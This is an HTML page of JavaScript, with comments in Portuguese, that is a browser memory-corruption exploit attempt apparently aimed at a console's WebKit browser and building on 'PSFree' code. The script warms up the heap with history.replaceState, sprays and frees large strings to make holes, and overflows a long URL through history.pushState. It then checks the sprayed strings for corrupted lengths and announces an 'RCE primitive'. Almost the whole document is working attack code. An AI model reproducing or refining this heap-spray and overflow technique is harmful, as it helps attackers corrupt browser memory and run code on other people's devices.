<!DOCTYPE html>
<html>
<head>
    <title>Primed Ice Bridge (Bypass Crash)</title>
    <style>
        body { background-color: #000; color: #00ffff; font-family: monospace; padding: 20px; }
        button { 
            font-size: 24px; padding: 20px; width: 100%; border: 2px solid #00ffff; background: #111; color: #fff; cursor: pointer; margin-bottom: 20px;
        }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
        .win { background-color: #00ffff; color: #000; font-weight: bold; font-size: 1.6em; padding: 10px; border: 4px solid white; }
    </style>
</head>
<body>

    <h1>Primed Ice Bridge</h1>
    <p>Usando Aquecimento para alinhar e Zeros para evitar o Crash.</p>

    <button onclick="startPrimedBridge()">TENTAR EVITAR CRASH (ZEROS)</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        const BASE_OFFSET = 709520; 
        const OVERFLOW_AMT = 1024 * 64; 

        // Tenta pular os primeiros 8 bytes (StructureID + Flags)
        // Se o crash continuar, tente aumentar para 16
        const ZERO_BRIDGE_SIZE = 8; 

        // 1MB Alinhado
        const TARGET_SIZE = 1024 * 1024; 
        const PAYLOAD_SIZE = TARGET_SIZE - 24; 

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : '';
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

        // Função do PSFree para criar string flat
        function createPSFreeString(size, index) {
            const u32 = new Uint32Array(1);
            u32[0] = index;
            const u8 = new Uint8Array(u32.buffer);
            const padLen = size - 4; 
            const pad = "B".repeat(padLen);
            return [pad, String.fromCodePoint(...u8)].join('');
        }

        async function startPrimedBridge() {
            log("--- FASE 0: AQUECIMENTO (WARMUP) ---");
            
            // 1. PRIMING
            let dummyPayload = "W".repeat(BASE_OFFSET + 100); 
            history.replaceState("warmup", "warmup", "/" + dummyPayload);
            
            log("Alocador aquecido. Iniciando Spray...");
            await sleep(100);

            // 2. SPRAY
            victims = [];
            const SPRAY_COUNT = 60; // Reduzido levemente para evitar OOM rápido

            try {
                for(let i=0; i<SPRAY_COUNT; i++) {
                    let s = createPSFreeString(PAYLOAD_SIZE, i);
                    victims.push(s);
                }

                // 3. BURACOS
                log("Criando buracos...");
                for(let i=0; i<SPRAY_COUNT; i+=2) {
                    victims[i] = null;
                }

                await forceGC();

                // 4. EXPLOIT (COM PONTE DE ZEROS)
                log(`Disparando Overflow (Ponte de ${ZERO_BRIDGE_SIZE} zeros)...`);
                setTimeout(() => {
                    try {
                        let buffer = "A".repeat(BASE_OFFSET);
                        
                        // AQUI ESTÁ A CURA PARA O CRASH:
                        buffer += "\u0000".repeat(ZERO_BRIDGE_SIZE);
                        
                        // O RESTO DO ATAQUE:
                        buffer += "\x01".repeat(OVERFLOW_AMT);
                        
                        history.pushState({}, "pwn", "/" + buffer);

                        log("Verificando se sobreviveu e corrompeu...");
                        checkCorruption(PAYLOAD_SIZE);

                    } catch (e) {
                        log("Erro: " + e.message);
                    }
                }, 500);

            } catch(e) {
                log("Erro Memória: " + e.message);
            }
        }

        function checkCorruption(expectedLen) {
            let success = false;
            for(let i=1; i<victims.length; i+=2) {
                let s = victims[i];
                if(!s) continue;

                try {
                    let err = new Error(s);
                    let msg = err.message;

                    // SUCESSO
                    if (msg.length !== expectedLen) {
                        log(`!!! JACKPOT !!! String ${i} Length: ${msg.length}`, 'win');
                        alert("RCE PRIMITIVE UNLOCKED!");
                        success = true;
                        break;
                    }

                    // DADOS (Se o zero passou mas o 0x01 pegou dados)
                    if (msg.charCodeAt(0) !== 66) { 
                        log(`[DADOS] String ${i} corrompida, mas Length intacto.`, 'win');
                        success = true;
                        break;
                    }
                } catch(e) {}
            }
            if(!success) log("Nada atingido (Mas se não crashou, avançamos!).");
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 800));
        }
    </script>
</body>
</html>
